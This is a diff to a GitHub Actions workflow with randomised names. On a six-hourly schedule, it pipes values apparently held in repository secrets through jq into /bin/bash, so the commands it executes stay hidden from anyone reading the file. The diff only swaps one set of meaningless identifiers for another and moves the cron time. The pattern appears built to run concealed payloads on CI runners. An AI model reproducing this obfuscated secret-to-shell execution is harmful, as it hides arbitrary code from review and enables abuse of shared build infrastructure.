@@ -1,25 +1,25 @@
 name: alarmingsussex
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
-
+    - cron: '4 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: alarmingsussex
         env:
-          jioz1: ${{ secrets.jioz1 }}
+          gofyo0: ${{ secrets.gofyo0 }}
         run: |
-          echo $jioz1 | jq -r .zl02 | /bin/bash
-          echo $hauee40 | jq -r .lvuhg31024 | /bin/bash
-          echo $sifqw726 | jq -r .i1 | /bin/bash
-          echo $ryrfw13992 | jq -r .yjvf6536 | /bin/bash
-          echo $cwpk62 | jq -r .tw458 | /bin/bash
-          echo $ywp5 | jq -r .isye560 | /bin/bash
-          echo $av3 | jq -r .z6 | /bin/bash
-          echo $zfd49291 | jq -r .vgjon9 | /bin/bash
+          echo $gofyo0 | jq -r .sdfgd9079 | /bin/bash
+          echo $rh48 | jq -r .k37 | /bin/bash
+          echo $gnd94 | jq -r .g26134 | /bin/bash
+          echo $au90 | jq -r .ml329 | /bin/bash
+          echo $a094 | jq -r .aipv4 | /bin/bash
+          echo $cnht3155 | jq -r .as9455 | /bin/bash
+          echo $dvzk5 | jq -r .ms242 | /bin/bash
+          echo $dgxp2 | jq -r .grop0 | /bin/bash
+          echo $l6547 | jq -r .ezb9 | /bin/bash
 
